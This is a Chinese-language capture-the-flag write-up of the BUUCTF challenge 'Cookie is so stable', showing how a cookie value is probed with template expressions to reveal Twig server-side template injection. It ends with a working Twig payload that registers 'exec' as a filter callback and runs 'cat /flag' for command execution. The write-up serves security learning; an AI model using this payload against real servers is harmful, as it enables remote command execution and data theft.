# T21 Cookie is so stable

> 题目：BUUCTF [BJDCTF2020]Cookie is so stable

__0X00 审题__

打开页面，看到他在欢迎我们（，有两个页面，flag，hint

依次点开，hint中注意看源码

```
<!-- Why not take a closer look at cookies? -->
```

可以看出，重点在cookie，结合题目名称可以理解，重点出在cookie上，然后打开flag

让写名字，admin进入后发现：

```
{
	"请求头 (586 字节)": {
		"headers": [
			{
				"name": "Accept",
				"value": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
			},
			{
				"name": "Accept-Encoding",
				"value": "gzip, deflate"
			},
			{
				"name": "Accept-Language",
				"value": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
			},
			{
				"name": "Connection",
				"value": "keep-alive"
			},
			{
				"name": "Cookie",
				"value": "PHPSESSID=bf057f951b7570f17012c6e686dd8b1e; user=admin"
			},
			{
				"name": "Host",
				"value": "c60add8c-dc7b-4a07-81c6-cfe6a4d052df.node4.buuoj.cn:81"
			},
			{
				"name": "Referer",
				"value": "http://c60add8c-dc7b-4a07-81c6-cfe6a4d052df.node4.buuoj.cn:81/flag.php"
			},
			{
				"name": "Upgrade-Insecure-Requests",
				"value": "1"
			},
			{
				"name": "User-Agent",
				"value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
			}
		]
	}
}
```

* 其中cookie的值后跟着user=admin

经过改变user值，发现其随着改变

__0x01 解题__

1. BP抓包，

```
Cookie: PHPSESSID=bf057f951b7570f17012c6e686dd8b1e; user=
```
当输入为{{7*7}}，返回49

输入{{7*'7'}}，返回49

两个返回相同

> 到这里，我们已经可以看出，这个题是关于SSTI漏洞，何为SSTI漏洞（曾经在[第十一题](https://github.com/uicciu/uicciu.github.io/blob/ctf/T11%20%E8%BF%87%E5%B9%B4%E4%B8%AD.md)有缘相见）

> 但是很显然他解决不了我的迷惑（所以再放一篇[关于SSTI](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig))

2. 到此我们已知此题是Twig,后我们可以构造payload

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

即可得到答案

__0x02 总结__

* 关于服务器模板注入的类型，原理，攻击方法
* 注：关于复习


